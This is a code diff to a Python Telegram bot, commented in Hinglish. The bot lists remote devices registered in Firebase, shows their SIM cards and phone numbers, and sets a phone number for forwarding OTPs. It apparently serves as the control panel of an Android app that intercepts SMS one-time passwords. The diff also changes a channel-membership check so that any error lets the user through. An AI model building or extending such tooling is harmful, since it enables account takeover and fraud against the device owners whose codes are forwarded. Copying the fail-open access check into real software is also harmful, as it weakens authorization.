@@ -141,8 +141,8 @@ async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             return False
     except Exception as e:
         logger.error(f"Membership check error for {user_id}: {e}")
-        await send_join_required_message(update, context)
-        return False
+        # Agar bot channel ka admin nahi hai toh check bypass karo
+        return True
 
 def is_owner(user_id: int) -> bool:
     return user_id == OWNER_CHAT_ID
@@ -188,7 +188,23 @@ async def check_membership_callback(update: Update, context: ContextTypes.DEFAUL
             )
     except Exception as e:
         logger.error(f"Callback membership check error: {e}")
-        await query.edit_message_text("⚠️ Error checking membership. Please try again later.")
+        # Bot channel ka admin nahi - user ko allow karo
+        await query.edit_message_text(
+            f"✅ <b>Welcome to {BOT_NAME}!</b>\n\nUse /start to see all commands.",
+            parse_mode="HTML"
+        )
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"{BOT_NAME} <b>WELCOME</b>\n\n"
+                 f"<b>Available commands:</b>\n"
+                 f"/setup – Configure Firebase URL & Channel ID\n"
+                 f"/devices – Select device and SIM\n"
+                 f"/setotp – Set forwarding phone number\n"
+                 f"/resetforward – Reset old message tracker\n"
+                 f"/help – Show this message",
+            parse_mode='HTML',
+            disable_web_page_preview=True,
+        )
 
 # ============================
 # HELP / START
@@ -399,16 +415,30 @@ def firebase_put(user_id, path, data):
     except Exception as e:
         logger.error(f"Firebase PUT error: {e}")
 
+def normalize_sims(sims_raw):
+    """Firebase arrays ko proper list mein convert karo"""
+    if not sims_raw:
+        return []
+    if isinstance(sims_raw, list):
+        return [s for s in sims_raw if s]
+    if isinstance(sims_raw, dict):
+        return [v for k, v in sorted(sims_raw.items()) if v]
+    return []
+
 def get_online_devices(user_id):
     data = firebase_get(user_id, "clients")
     if not data:
         return {}
     online = {}
     for dev_id, info in data.items():
-        if info.get("status") == True:
+        if not isinstance(info, dict):
+            continue
+        status = info.get("status")
+        if status == True or status == "true" or status == 1:
+            sims = normalize_sims(info.get("sims"))
             online[dev_id] = {
-                "modelName": info.get("modelName", "Unknown"),
-                "sims": info.get("sims", [])
+                "modelName": info.get("modelName", info.get("model", "Unknown")),
+                "sims": sims
             }
     return online
 
@@ -580,13 +610,32 @@ async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     sims = device_data.get("sims", [])
     if not sims:
-        await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode='HTML')
+        await query.edit_message_text(
+            f"<b>❌ No SIMs found on this device.</b>\n\n"
+            f"<b>Possible reasons:</b>\n"
+            f"• App ne SIM info Firebase pe save nahi ki\n"
+            f"• Device restart karo aur dobara try karo\n"
+            f"• App permissions check karo (Phone State permission)",
+            parse_mode='HTML'
+        )
         return
     keyboard = []
-    for sim in sims:
-        slot = sim.get("simSlotIndex", "?")
-        phone = sim.get("phoneNumber", "N/A")
-        callback_data = f"sim_{device_id}_{slot}_{phone}"
+    for i, sim in enumerate(sims):
+        if not isinstance(sim, dict):
+            continue
+        # Multiple possible field names handle karo
+        slot = sim.get("simSlotIndex", sim.get("slotIndex", sim.get("slot", i)))
+        phone = (
+            sim.get("phoneNumber")
+            or sim.get("phone")
+            or sim.get("number")
+            or sim.get("simPhoneNumber")
+            or "Unknown"
+        )
+        # Telegram callback_data max 64 bytes hota hai
+        short_device = device_id[:20] if len(device_id) > 20 else device_id
+        short_phone = str(phone)[:15]
+        callback_data = f"sim_{short_device}_{slot}_{short_phone}"
         keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
     await query.edit_message_text(
         f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
@@ -604,9 +653,10 @@ async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(parts) < 4:
         await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
         return
+    # sim_DEVICEID_SLOT_PHONE format - device ID mein _ ho sakta hai
     device_id = parts[1]
-    slot = parts[2]
-    phone = parts[3]
+    slot = parts[-2]
+    phone = parts[-1]
     set_selected(user_id, device_id, slot, phone)
     await query.edit_message_text(
         f"<b>✅ Active!</b>\n"
